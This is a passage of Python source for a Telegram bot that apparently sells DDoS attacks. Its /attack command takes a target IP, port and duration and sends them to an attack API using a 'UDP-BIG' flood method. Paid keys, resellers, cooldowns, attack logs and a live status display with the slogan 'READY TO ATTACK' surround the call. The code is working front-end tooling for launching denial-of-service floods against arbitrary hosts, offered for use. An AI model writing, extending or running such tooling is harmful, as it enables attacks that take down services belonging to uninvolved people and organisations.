                    "  ⚠️ <b>ᴋʀɪᴘʏᴀ ᴄᴏᴏʟᴅᴏᴡɴ ᴋᴀ ɪɴᴛᴇᴢᴀᴀʀ ᴋᴀʀᴏ</b>",
                    parse_mode="HTML")
            except Exception as cd_err:
                print(f"⚠️ Cooldown message error: {cd_err}")
                cooldown_msg = None

            def live_cooldown_countdown():
                try:
                    while True:
                        time.sleep(1)
                        remaining = get_cd_remaining(uid)
                        if remaining <= 0:
                            if cooldown_msg:
                                try:
                                    bot.delete_message(cid, cooldown_msg.message_id)
                                except: pass
                            print(f"✅ Cooldown complete for {uid}")
                            return
                        if cooldown_msg:
                            try:
                                bot.edit_message_text(
                                    chat_id=cid,
                                    message_id=cooldown_msg.message_id,
                                    text=(
                                        "╔══════════════════════════╗\n"
                                        "║            ☢️ 𝗖𝗢𝗢𝗟𝗗𝗢𝗪𝗡 𝗔𝗖𝗧𝗜𝗩𝗘 🚧        ║\n"
                                        "╚══════════════════════════╝\n\n"
                                        f"  ◆ ⏳ ʀᴇᴍᴀɪɴɪɴɢ ➪ <b>{remaining} ꜱᴇᴄᴏɴᴅꜱ</b>\n"
                                        f"  ◆ 📅 ᴛɪᴍᴇ ➪ <code>{ist_time_str()} IST</code>\n\n"
                                        "  ⚠️ <b>ᴋʀɪᴘʏᴀ ᴄᴏᴏʟᴅᴏᴡɴ ᴋᴀ ɪɴᴛᴇᴢᴀᴀʀ ᴋᴀʀᴏ</b>"
                                    ),
                                    parse_mode="HTML"
                                )
                            except Exception as edit_err:
                                err_str = str(edit_err).lower()
                                if "message is not modified" not in err_str:
                                    print(f"⚠️ Cooldown edit error: {edit_err}")
                except Exception as e:
                    print(f"⚠️ Cooldown countdown error: {e}")

            threading.Thread(target=live_cooldown_countdown, daemon=True).start()
            return

        if is_attack_running(uid):
            safe_reply(msg,
                "╔══════════════════════════╗\n"
                "║              🛑 𝗔𝗧𝗧𝗔𝗖𝗞 𝗥𝗨𝗡𝗡𝗜𝗡𝗚 🚷         ║\n"
                "╚══════════════════════════╝\n\n"
                "  ⚠️ <b>ᴀᴀᴘᴋᴀ ᴇᴋ ᴀᴛᴛᴀᴄᴋ ᴀʟʀᴇᴀᴅʏ ʀᴜɴɴɪɴɢ ʜᴀɪ!</b>",
                parse_mode="HTML")
            return

        set_cd(uid)
        name = msg.from_user.username or f"User_{uid}"

        ok, r = api_attack(ip, port, dur)
        if not ok:
            safe_reply(msg, f"❌ <b>ꜰᴀɪʟᴇᴅ</b>\n<code>{escape_html(r[:300])}</code>", parse_mode="HTML"); return

        HEALTH["total_attacks"] += 1
        start_time = ist_now()
        end_time = start_time + timedelta(seconds=dur)
        attack_id = f"{uid}_{int(time.time()*1000)}"
        _stop_flags[attack_id] = False

        def build_attack_caption():
            try:
                now = ist_now()
                elapsed = int((now - start_time).total_seconds())
                rem = max(0, dur - elapsed)
                pct = min(100, int((elapsed / dur) * 100)) if dur > 0 else 0
                filled = int(pct / 10)
                bar = "▰" * filled + "▱" * (10 - filled)

                if pct < 20: st = "🔴 ᴊᴜꜱᴛ ꜱᴛᴀʀᴛᴇᴅ"
                elif pct < 50: st = "🟠 ɪɴ ᴘʀᴏɢʀᴇꜱꜱ"
                elif pct < 80: st = "🟡 ᴍᴏʀᴇ ᴛʜᴀɴ ʜᴀʟꜰ"
                elif pct < 100: st = "🟢 ᴀʟᴍᴏꜱᴛ ᴅᴏɴᴇ"
                else: st = "✅ ᴄᴏᴍᴘʟᴇᴛᴇ"

                rem_m = rem // 60; rem_s = rem % 60
                start_str = ist_time_str(start_time)
                end_str = ist_time_str(end_time)
                method_str = escape_html(get_setting('api_method', 'UDP-BIG'))
                geo_str = escape_html(get_setting('api_geolocation', 'ALL'))

                return (
                    "╔═════════════════════════╗\n"
                    "║         🐣 𝗔𝗧𝗧𝗔𝗖𝗞 𝗟𝗔𝗨𝗡𝗖𝗛𝗘𝗗 🦜         ║\n"
                    "╚═════════════════════════╝\n\n"
                    + f"  {bar} {pct}%\n"
                    + f"  {st}\n\n"
                    + "┏━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                    + "┃               ⚔️ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗗𝗘𝗧𝗔𝗜𝗟𝗦 🪏        ┃\n"
                    + "┗━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
                    + f"  ◆ 👤 ᴜꜱᴇʀ ➪ <b>@{escape_html(name)}</b>\n"
                    + f"  ◆ 🎯 ᴛᴀʀɢᴇᴛ ➪ <code>{ip}:{port}</code>\n"
                    + f"  ◆ ⏱️ ᴅᴜʀᴀᴛɪᴏɴ ➪ <b>{dur}ꜱ</b>\n"
                    + f"  ◆ 🚀 ᴍᴇᴛʜᴏᴅ ➪ <b>{method_str}</b>\n"
                    + f"  ◆ 🌍 ɢᴇᴏ ➪ <code>{geo_str}</code>\n\n"
                    + "┏━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                    + "┃               🕰️ 𝗧𝗜𝗠𝗘 𝗧𝗥𝗔𝗖𝗞𝗜𝗡𝗚 ⏲️          ┃\n"
                    + "┗━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
                    + f"  ◆ ▶️ ꜱᴛᴀʀᴛ ➪ <code>{start_str} IST</code>\n"
                    + f"  ◆ ⏹️ ᴇɴᴅ ➪ <code>{end_str} IST</code>\n"
                    + f"  ◆ ⏳ ᴇʟᴀᴘꜱᴇᴅ ➪ <b>{elapsed}ꜱ</b>\n"
                    + f"  ◆ ⏱️ ʀᴇᴍᴀɪɴɪɴɢ ➪ <b>{rem_m}ᴍ {rem_s}ꜱ</b>\n\n"
                    + "╔═════════════════════════╗\n"
                    + "║           🍭 𝗔𝗧𝗧𝗔𝗖𝗞 𝗥𝗨𝗡𝗡𝗜𝗡𝗚 🥂          ║\n"
                    + "╚═════════════════════════╝"
                )
            except: return "💀 ᴀᴛᴛᴀᴄᴋ ʀᴜɴɴɪɴɢ..."

        chosen_video = get_random_video()
        attack_msg = None
        is_video = False

        # ★ Attack start wali video save karo
        start_video_id = chosen_video if chosen_video else None
        print(f"🎬 START VIDEO: {start_video_id[:30] if start_video_id else 'None'}...")

        if chosen_video:
            try:
                print(f"📹 Sending video for attack...")
                attack_msg = bot.send_video(cid, chosen_video, caption=build_attack_caption(), parse_mode="HTML")
                is_video = True
                print(f"✅ Attack video sent")
            except Exception as e:
                print(f"❌ Video attack send failed: {e}, falling back to text")
                try:
                    attack_msg = bot.reply_to(msg, build_attack_caption(), parse_mode="HTML")
                except Exception as e2:
                    print(f"❌ Fallback also failed: {e2}")
                    return
        else:
            attack_msg = bot.reply_to(msg, build_attack_caption(), parse_mode="HTML")

        data["attack_logs"].append({
            'user_id': uid, 'username': name, 'target': ip, 'port': port,
            'duration': dur, 'timestamp': ist_now().isoformat()
        })
        if str(uid) in ensure_dict(data.get("users", {})):
            if isinstance(data["users"][str(uid)], dict):
                data["users"][str(uid)]["total_attacks"] = safe_int(data["users"][str(uid)].get("total_attacks", 0)) + 1
        save_data(data)

        with attack_lock:
            active_attacks[attack_id] = {
                'target': ip, 'port': port, 'duration': dur,
                'user_id': uid, 'username': name,
                'end_time': end_time, 'start_time': start_time
            }

        def auto_update_attack():
            last_text = None
            while True:
                now = ist_now()
                if now >= end_time:
                    print(f"✅ Attack {attack_id} time complete")
                    return
                if _stop_flags.get(attack_id, False):
                    print(f"⛔ Attack {attack_id} stopped by flag")
                    return

                time.sleep(UPDATE_INTERVAL)

                now = ist_now()
                if now >= end_time:
                    print(f"✅ Attack {attack_id} time complete")
                    return
                if _stop_flags.get(attack_id, False):
                    return

                try:
                    new_text = build_attack_caption()
                    if new_text != last_text:
                        success = False
                        for _attempt in range(3):
                            try:
                                if is_video:
                                    r = safe_edit_caption(cid, attack_msg.message_id, new_text, parse_mode="HTML")
                                else:
                                    r = safe_edit_text(cid, attack_msg.message_id, new_text, parse_mode="HTML")

                                if r is not None and r != "NOT_MODIFIED":
                                    success = True
                                    last_text = new_text
                                    break
                                elif r == "NOT_MODIFIED":
                                    success = True
                                    last_text = new_text
                                    break
                            except Exception as inner_e:
                                print(f"⚠️ Attack update attempt {_attempt+1}: {inner_e}")
                                time.sleep(1)

                        if not success:
                            print(f"⚠️ Attack {attack_id} update skipped this cycle")
                except Exception as e:
                    print(f"⚠️ auto_update_attack error: {e}")
                    time.sleep(1)

        threading.Thread(target=auto_update_attack, daemon=True).start()

        def done():
            for _ in range(dur):
                time.sleep(1)
                if _stop_flags.get(attack_id, False):
                    print(f"⛔ Attack {attack_id} stopped early")
                    _stop_flags.pop(attack_id, None)
                    with attack_lock: active_attacks.pop(attack_id, None)
                    return

            with attack_lock: active_attacks.pop(attack_id, None)
            _stop_flags.pop(attack_id, None)

            # ★ Complete video pick karo — start wali se ALAG
            complete_video = None
            for _try in range(10):
                _candidate = get_random_video()
                if _candidate and _candidate != start_video_id:
                    complete_video = _candidate
                    break
                elif _candidate and len(ensure_list(data.get("videos", []))) == 1:
                    complete_video = _candidate
                    break
                time.sleep(0.1)
            print(f"🎬 COMPLETE VIDEO: {complete_video[:30] if complete_video else 'None'}...")

            if data.get("feedback_enabled", False) and not is_owner(uid):
                data["pending_attacks"][str(uid)] = {
                    "last_target": ip,
                    "last_port": port,
                    "last_duration": dur,
                    "attack_cmd": f"/attack {ip} {port} {dur}",
                    "completed_at": ist_now().isoformat()
                }
                save_data(data)

            try:
                bot.delete_message(cid, attack_msg.message_id)
                print(f"🗑️ Purana attack message delete kiya")
            except Exception as del_err:
                print(f"⚠️ Delete failed: {del_err}")

            if data.get("feedback_enabled", False) and not is_owner(uid):
                complete_caption = (
                    "╔══════════════════════════╗\n"
                    "║            ☑️ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘 ☑️      ║\n"
                    "╚══════════════════════════╝\n\n"
                    "┏━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                    "┃                ♻️ 𝗙𝗜𝗡𝗔𝗟 𝗥𝗘𝗣𝗢𝗥𝗧 📊            ┃\n"
                    "┗━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
                    f"  ◆ 👤 ᴜꜱᴇʀ ➪ <b>@{escape_html(name)}</b>\n"
                    f"  ◆ 🎯 ᴛᴀʀɢᴇᴛ ➪ <code>{ip}</code>\n"
                    f"  ◆ 🚪 ᴘᴏʀᴛ ➪ <code>{port}</code>\n"
                    f"  ◆ ⏱️ ᴅᴜʀᴀᴛɪᴏɴ ➪ <b>{dur}ꜱ</b>\n"
                    f"  ◆ ▶️ ꜱᴛᴀʀᴛ ➪ <code>{ist_time_str(start_time)} IST</code>\n"
                    f"  ◆ ⏹️ ᴇɴᴅ ➪ <code>{ist_time_str(end_time)} IST</code>\n\n"
                    "┏━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                    "┃               📟 ᴀᴛᴛᴀᴄᴋ ᴄᴏᴍᴍᴀɴᴅ 📋           ┃\n"
                    "┗━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
                    f"  <code>/attack {ip} {port} {dur}</code>\n\n"
                    "╔═════════════════════════╗\n"
                    "║      🎞️ 𝗦𝗖𝗥𝗘𝗘𝗡𝗦𝗛𝗢𝗧 𝗥𝗘𝗤𝗨𝗜𝗥𝗘𝗗 📸  ║\n"
                    "╚═════════════════════════╝\n\n"
                    "  ⚠️ <b>ɴᴇxᴛ ᴀᴛᴛᴀᴄᴋ ʟᴀɢᴀɴᴇ ᴋᴇ ʟɪʏᴇ ꜱᴄʀᴇᴇɴꜱʜᴏᴛ ʙʜᴇᴊᴇ</b>\n\n"
                    "  📌 <b>ᴀᴀᴘ ᴇꜱ ᴀᴛᴛᴀᴄᴋ ᴋᴀ ꜱᴄʀᴇᴇɴꜱʜᴏᴛ ʙʜᴇᴊᴇɪɴ</b>\n"
                    "  📌 <b>ᴛᴀʙʜɪ ɴᴇxᴛ ᴀᴛᴛᴀᴄᴋ ʟᴀɢᴀ ꜱᴀᴋᴛᴇ ʜᴏ</b>\n\n"
                    "╔═════════════════════════╗\n"
                    "║             🗼 𝗔𝗧𝗧𝗔𝗖𝗞 𝗦𝗨𝗖𝗖𝗘𝗦𝗦 🧿       ║\n"
                    "╚═════════════════════════╝"
                )
                if complete_video:
                    try:
                        bot.send_video(cid, complete_video, caption=complete_caption, parse_mode="HTML", reply_to_message_id=msg.message_id)
                        print(f"✅ Complete video sent")
                    except Exception as e:
                        print(f"❌ Complete video failed: {e}, falling back to text")
                        try:
                            bot.send_message(cid, complete_caption, parse_mode="HTML", reply_to_message_id=msg.message_id)
                        except Exception as e2:
                            print(f"Complete msg error: {e2}")
                else:
                    try:
                        bot.send_message(cid, complete_caption, parse_mode="HTML", reply_to_message_id=msg.message_id)
                    except Exception as e:
                        print(f"Complete msg error: {e}")
            else:
                complete_caption = (
                    "╔══════════════════════════╗\n"
                    "║              🌼 𝗔𝗧𝗧𝗔𝗖𝗞 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘 ☑️       ║\n"
                    "╚══════════════════════════╝\n\n"
                    "┏━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                    "┃                🚮 𝗙𝗜𝗡𝗔𝗟 𝗥𝗘𝗣𝗢𝗥𝗧 📊            ┃\n"
                    "┗━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
                    f"  ◆ 👤 ᴜꜱᴇʀ ➪ <b>@{escape_html(name)}</b>\n"
                    f"  ◆ 🎯 ᴛᴀʀɢᴇᴛ ➪ <code>{ip}</code>\n"
                    f"  ◆ 🚪 ᴘᴏʀᴛ ➪ <code>{port}</code>\n"
                    f"  ◆ ⏱️ ᴅᴜʀᴀᴛɪᴏɴ ➪ <b>{dur}ꜱ</b>\n"
                    f"  ◆ ▶️ ꜱᴛᴀʀᴛ ➪ <code>{ist_time_str(start_time)} IST</code>\n"
                    f"  ◆ ⏹️ ᴇɴᴅ ➪ <code>{ist_time_str(end_time)} IST</code>\n\n"
                    "┏━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                    "┃           ☢️ ᴀᴛᴛᴀᴄᴋ ᴄᴏᴍᴍᴀɴᴅ 📋           ┃\n"
                    "┗━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
                    f"  <code>/attack {ip} {port} {dur}</code>\n\n"
                    "╔══════════════════════════╗\n"
                    "║             💛 𝗔𝗧𝗧𝗔𝗖𝗞 𝗦𝗨𝗖𝗖𝗘𝗦𝗦 🎯          ║\n"
                    "╚══════════════════════════╝"
                )
                if complete_video:
                    try:
                        bot.send_video(cid, complete_video, caption=complete_caption, parse_mode="HTML", reply_to_message_id=msg.message_id)
                        print(f"✅ Complete video sent")
                    except Exception as e:
                        print(f"❌ Complete video failed: {e}, falling back to text")
                        try:
                            bot.send_message(cid, complete_caption, parse_mode="HTML", reply_to_message_id=msg.message_id)
                        except Exception as e2:
                            print(f"Complete msg error: {e2}")
                else:
                    try:
                        bot.send_message(cid, complete_caption, parse_mode="HTML", reply_to_message_id=msg.message_id)
                    except Exception as e:
                        print(f"Complete msg error: {e}")

        threading.Thread(target=done, daemon=True).start()

    except Exception as e:
        HEALTH["total_errors"] += 1
        print(f"❌ cmd_attack error: {e}")
        traceback.print_exc()


# ============= STATUS =============
def do_status(msg):
    try:
        if check_ban(msg): return
        uid = msg.from_user.id
        cid = msg.chat.id

        # ★★★ KEY CHECK — Active key ke bina status nahi milega ★★★
        if not is_owner(uid) and not has_valid_key(uid):
            state = key_state(uid)
            if state == "expired":
                safe_reply(msg,
                    "╔══════════════════════════╗\n"
                    "║                 🚷 𝗞𝗘𝗬 𝗘𝗫𝗣𝗜𝗥𝗘𝗗 ♍                ║\n"
                    "╚══════════════════════════╝\n\n"
                    "  ⚠️ <b>ᴀᴀᴘᴋɪ ᴋᴇʏ ᴇxᴘɪʀᴇ ʜᴏ ᴄʜᴜᴋɪ ʜᴀɪ!</b>\n\n"
                    "  📌 <b>ɴᴀʏᴀ ᴋᴇʏ ʀᴇᴅᴇᴇᴍ ᴋᴀʀᴏ:</b>\n"
                    "  ➤ <code>/redeem YOUR-KEY</code>",
                    parse_mode="HTML", reply_markup=dev_btn_kb())
            else:
                safe_reply(msg,
                    "╔══════════════════════════╗\n"
                    "║               🔋 𝗡𝗢 𝗞𝗘𝗬 𝗙𝗢𝗨𝗡𝗗 🪫              ║\n"
                    "╚══════════════════════════╝\n\n"
                    "⚠️ ᴀᴀᴘᴋᴇ ᴘᴀᴀꜱ ᴋᴏɪ ᴀᴄᴛɪᴠᴇ ᴋᴇʏ ɴᴀʜɪ ʜᴀɪ!\n\n"
                    "📌 ꜱᴛᴀᴛᴜꜱ ᴅᴇᴋʜɴᴇ ᴋᴇ ʟɪʏᴇ ᴋᴇʏ ʀᴇᴅᴇᴇᴍ ᴋᴀʀᴏ\n"
                    "     ➤ /redeem ♪ 𝐘𝐎𝐔𝐑◈𝐊𝐄𝐘 ♪ ▸\n\n"
                    "  ⚠ Cᴏᴍᴍᴀɴᴅ ᴋᴇ ʙᴀᴀᴅ KᴇY Dᴀʟ Lᴀᴜᴅᴇ ⚠",                    
                    parse_mode="HTML", reply_markup=dev_btn_kb())
            return

        try:
            status_msg = bot.send_message(cid, "📊 ʟᴏᴀᴅɪɴɢ ꜱᴛᴀᴛᴜꜱ...")
        except Exception as e:
            print(f"Status send error: {e}"); return

        current_mid = [status_msg.message_id]

        def build_status():
            try:
                now = ist_now()
                running = []
                try:
                    with attack_lock:
                        for aid, atk in list(active_attacks.items()):
                            if not isinstance(atk, dict): continue
                            end_t = atk.get('end_time')
                            if not isinstance(end_t, datetime): continue
                            if end_t > now: running.append(dict(atk))
                except: running = []

                uptime_sec = int((ist_now() - BOT_START_TIME).total_seconds())
                days = uptime_sec // 86400; hrs = (uptime_sec % 86400) // 3600
                mins = (uptime_sec % 3600) // 60; secs = uptime_sec % 60
                uptime_str = f"{days:02d}ᴅ {hrs:02d}ʜ {mins:02d}ᴍ {secs:02d}ꜱ"

                total_users = len(ensure_dict(data.get('users', {})))
                total_attacks = len(ensure_list(data.get('attack_logs', [])))
                total_keys = len(ensure_dict(data.get('keys', {})))
                total_stickers = len(ensure_list(data.get('stickers', [])))
                total_videos = len(ensure_list(data.get('videos', [])))
                total_pyf = len(ensure_list(data.get('pyf_videos', [])))
                total_banned = len(ensure_dict(data.get('banned_users', {})))
                total_fb = len(ensure_list(data.get('feedbacks', [])))

                user_data = ensure_dict(data.get('users', {})).get(str(uid), {})
                if not isinstance(user_data, dict): user_data = {}
                user_attacks = safe_int(user_data.get('total_attacks', 0))
                time_left = time_remaining(uid)
                role = "👑 ᴏᴡɴᴇʀ" if is_owner(uid) else ("💼 ʀᴇꜱᴇʟʟᴇʀ" if is_reseller(uid) else "👤 ᴜꜱᴇʀ")

                txt = ""

                if running:
                    atk = running[0]
                    atk_start = atk.get('start_time', now)
                    if not isinstance(atk_start, datetime): atk_start = now
                    atk_end = atk.get('end_time', now)
                    if not isinstance(atk_end, datetime): atk_end = now
                    rem = max(0, int((atk_end - now).total_seconds()))
                    dur = safe_int(atk.get('duration', 60), 60)
                    elapsed = max(0, dur - rem)
                    pct = min(100, int((elapsed / dur) * 100)) if dur > 0 else 0
                    filled = int(pct / 10)
                    bar = "▰" * filled + "▱" * (10 - filled)

                    if pct < 20: st = "🔴 ᴊᴜꜱᴛ ꜱᴛᴀʀᴛᴇᴅ"
                    elif pct < 50: st = "🟠 ɪɴ ᴘʀᴏɢʀᴇꜱꜱ"
                    elif pct < 80: st = "🟡 ᴍᴏʀᴇ ᴛʜᴀɴ ʜᴀʟꜰ"
                    elif pct < 100: st = "🟢 ᴀʟᴍᴏꜱᴛ ᴅᴏɴᴇ"
                    else: st = "✅ ᴄᴏᴍᴘʟᴇᴛᴇ"

                    target = escape_html(f"{atk.get('target', 'N/A')}:{atk.get('port', 'N/A')}")
                    uname = escape_html(atk.get('username', 'Unknown'))
                    rem_m = rem // 60; rem_s = rem % 60
                    el_m = elapsed // 60; el_s = elapsed % 60

                    txt += (
                        "╔══════════════════════════╗\n"
                        "║           🎯 𝗟𝗜𝗩𝗘 𝗔𝗧𝗧𝗔𝗖𝗞 𝗦𝗧𝗔𝗧𝗨𝗦 🌐       ║\n"
                        "╚══════════════════════════╝\n\n"
                        + f"  {bar} {pct}%\n"
                        + f"  {st}\n\n"
                        + "┏━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                        + "┃               ♻️ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗗𝗘𝗧𝗔𝗜𝗟𝗦 💈        ┃\n"
                        + "┗━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
                        + f"  ◆ 🎯 ᴛᴀʀɢᴇᴛ ➪ <code>{target}</code>\n"
                        + f"  ◆ ▶️ ꜱᴛᴀʀᴛ ➪ <code>{ist_time_str(atk_start)} IST</code>\n"
                        + f"  ◆ ⏹️ ᴇɴᴅ ➪ <code>{ist_time_str(atk_end)} IST</code>\n"
                        + f"  ◆ ⏳ ᴇʟᴀᴘꜱᴇᴅ ➪ <b>{el_m}ᴍ {el_s}ꜱ</b>\n"
                        + f"  ◆ ⏱️ ʀᴇᴍᴀɪɴɪɴɢ ➪ <b>{rem_m}ᴍ {rem_s}ꜱ</b>\n"
                        + f"  ◆ 👤 ᴜꜱᴇʀ ➪ <b>@{uname}</b>\n\n"
                    )

                method = escape_html(get_setting('api_method', 'UDP-BIG'))
                geo = escape_html(get_setting('api_geolocation', 'ALL'))

                api_status = HEALTH.get("api_status", "🟡 ᴜɴᴋɴᴏᴡɴ")
                api_ping = safe_int(HEALTH.get("last_api_ping_ms", 0))
                api_success = safe_int(HEALTH.get("api_success", 0))
                api_failed = safe_int(HEALTH.get("api_failed", 0))
                total_errors = safe_int(HEALTH.get("total_errors", 0))
                total_msgs = safe_int(HEALTH.get("total_messages", 0))
                total_cmds = safe_int(HEALTH.get("total_commands", 0))

                if api_ping == 0: ping_icon = "⚪"; ping_status = "ɴᴏ ᴘɪɴɢ"
                elif api_ping < 200: ping_icon = "🟢"; ping_status = "ᴇxᴄᴇʟʟᴇɴᴛ"
                elif api_ping < 500: ping_icon = "🟡"; ping_status = "ɢᴏᴏᴅ"
                elif api_ping < 1000: ping_icon = "🟠"; ping_status = "ꜱʟᴏᴡ"
                else: ping_icon = "🔴"; ping_status = "ᴠᴇʀʏ ꜱʟᴏᴡ"

                if api_failed > 10 and api_success == 0:
                    health_status = "🔴 ᴜɴꜱᴛᴀʙʟᴇ"
                elif api_success > 0 and api_failed / max(1, api_success) < 0.3:
                    health_status = "🟢 ʜᴇᴀʟᴛʜʏ"
                elif api_failed > 0:
                    health_status = "🟡 ᴍɪɴᴏʀ ɪꜱꜱᴜᴇꜱ"
                else:
                    health_status = "🟢 ᴘᴇʀꜰᴇᴄᴛ"

                fb_status = "🟢 ᴏɴ" if data.get("feedback_enabled", False) else "🔴 ᴏꜰꜰ"
                maint_status = "🟢 ᴏɴ" if get_setting('maintenance_mode', False) else "🔴 ᴏꜰꜰ"

                txt += (
                    "╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬\n"
                    "╬              📊 🇧 🇴 🇹 𝗦𝗧𝗔𝗧𝗨𝗦 📊             ╬\n"
                    "╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬\n\n"
                    "┏━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                    "┃                  🤖 𝗕𝗢𝗧 𝗜𝗡𝗙𝗢 📶                   ┃\n"
                    "┗━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
                    + f"  ◆ ⚡ ꜱᴛᴀᴛᴜꜱ ➪ 🟢 <b>ᴏɴʟɪɴᴇ</b>\n"
                    + f"  ◆ ⏱️ ᴜᴘᴛɪᴍᴇ ➪ <b>{uptime_str}</b>\n"
                    + f"  ◆ 🎯 ᴍᴇᴛʜᴏᴅ ➪ <code>{method}</code>\n"
                    + f"  ◆ 🌍 ɢᴇᴏ ➪ <code>{geo}</code>\n\n"
                    + "┏━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                    + "┃              💚 𝗛𝗘𝗔𝗟𝗧𝗛 𝗖𝗛𝗘𝗖𝗞 💚            ┃\n"
                    + "┗━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
                    + f"  ◆ 🏥 ʜᴇᴀʟᴛʜ ➪ {health_status}\n"
                    + f"  ◆ 📡 ᴀᴘɪ ➪ {api_status}\n"
                    + f"  ◆ {ping_icon} ᴘɪɴɢ ➪ <b>{api_ping}ᴍꜱ</b>\n"
                    + f"  ◆ ✅ ꜱᴜᴄᴄᴇꜱꜱ ➪ <b>{api_success}</b>\n"
                    + f"  ◆ ❌ ꜰᴀɪʟᴇᴅ ➪ <b>{api_failed}</b>\n"
                    + f"  ◆ 💬 ᴍꜱɢꜱ ➪ <b>{total_msgs}</b>\n"
                    + f"  ◆ ⚙️ ᴄᴍᴅꜱ ➪ <b>{total_cmds}</b>\n"
                    + f"  ◆ ⚠️ ᴇʀʀᴏʀꜱ ➪ <b>{total_errors}</b>\n\n"
                    + "┏━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                    + "┃                   📈 𝗦𝗧𝗔𝗧𝗜𝗦𝗧𝗜𝗖𝗦 🌏              ┃\n"
                    + "┗━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
                    + f"  ◆ 👥 ᴜꜱᴇʀꜱ ➪ <b>{total_users}</b>\n"
                    + f"  ◆ 🔑 ᴋᴇʏꜱ ➪ <b>{total_keys}</b>\n"
                    + f"  ◆ 💀 ᴀᴛᴛᴀᴄᴋꜱ ➪ <b>{total_attacks}</b>\n"
                    + f"  ◆ 🚫 ʙᴀɴɴᴇᴅ ➪ <b>{total_banned}</b>\n"
                    + f"  ◆ ❄ ꜱᴛɪᴄᴋᴇʀꜱ ➪ <b>{total_stickers}</b>\n"
                    + f"  ◆ 📹 ᴠɪᴅᴇᴏꜱ ➪ <b>{total_videos}</b>\n"
                    + f"  ◆ 🎬 ᴘʏꜰ ➪ <b>{total_pyf}</b>\n"
                    + f"  ◆ 📩 ꜰᴇᴇᴅʙᴀᴄᴋꜱ ➪ <b>{total_fb}</b>\n\n"
                    + "┏━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                    + "┃                      ⚙️ 𝗦𝗬𝗦𝗧𝗘𝗠 ♻️                  ┃\n"
                    + "┗━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
                    + f"  ◆ 🔧 ᴍᴀɪɴᴛ ➪ {maint_status}\n"
                    + f"  ◆ 📩 ꜰᴇᴇᴅʙᴀᴄᴋ ➪ {fb_status}\n\n"
                    + "┏━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                    + "┃                   👤 𝗬𝗢𝗨𝗥 𝗜𝗡𝗙𝗢 🔮               ┃\n"
                    + "┗━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
                    + f"  ◆ 🎭 ʀᴏʟᴇ ➪ {role}\n"
                    + f"  ◆ 🎯 ʏᴏᴜʀ ᴀᴛᴛᴀᴄᴋꜱ ➪ <b>{user_attacks}</b>\n"
                    + f"  ◆ ⏰ ᴛɪᴍᴇ ➪ <b>{time_left}</b>\n"
                    + f"  ◆ 🕐 ɴᴏᴡ ➪ <code>{ist_time_str()} IST</code>\n\n"
                    + "≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈\n"
                    + "≈           🏹 READY TO ATTACK ☢️            ≈\n"
                    + "≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈"
                )
                return txt
            except Exception as e:
                HEALTH["total_errors"] += 1
                print(f"Build Status Error: {e}")
                traceback.print_exc()
                return "⚠️ <b>ꜱᴛᴀᴛᴜꜱ ᴛᴇᴍᴘᴏʀᴀʀɪʟʏ ᴜɴᴀᴠᴀɪʟᴀʙʟᴇ</b>"

        r = safe_edit_text(cid, current_mid[0], build_status(), parse_mode="HTML")
        if r is None:
            try: bot.delete_message(cid, current_mid[0])
            except: pass
            try:
                nm = bot.send_message(cid, build_status(), parse_mode="HTML")
                current_mid[0] = nm.message_id
            except: return

        def auto_update():
            last_text = None
            start_ts = time.time()
            for _ in range(int(AUTO_STOP_AFTER / UPDATE_INTERVAL) + 5):
                time.sleep(UPDATE_INTERVAL)
                if time.time() - start_ts > AUTO_STOP_AFTER:
                    print(f"⏹️ Status auto-update stopped after {AUTO_STOP_AFTER}s")
                    try:
                        stopped_text = build_status() + "\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n⏹️ <i>ᴜᴘᴅᴀᴛᴇꜱ ꜱᴛᴏᴘᴘᴇᴅ (2 ᴍɪɴ ʟɪᴍɪᴛ) — ꜰʀᴇꜱʜ ꜱᴛᴀᴛᴜꜱ ᴋᴇ ʟɪʏᴇ /status ᴅᴏʙᴀʀᴀ ʙʜᴇᴊᴏ</i>"
                        safe_edit_text(cid, current_mid[0], stopped_text, parse_mode="HTML")
                    except: pass
                    break
                try:
                    new_text = build_status()
                    if new_text != last_text:
                        r = safe_edit_text(cid, current_mid[0], new_text, parse_mode="HTML")
                        if r is None:
                            try: bot.delete_message(cid, current_mid[0])
                            except: pass
                            try:
                                nm = bot.send_message(cid, new_text, parse_mode="HTML")
                                current_mid[0] = nm.message_id
                            except: pass
                        elif r != "NOT_MODIFIED":
                            last_text = new_text
                except Exception as e:
                    print(f"auto_update_status err: {e}")
                    time.sleep(2)

        threading.Thread(target=auto_update, daemon=True).start()
    except Exception as e:
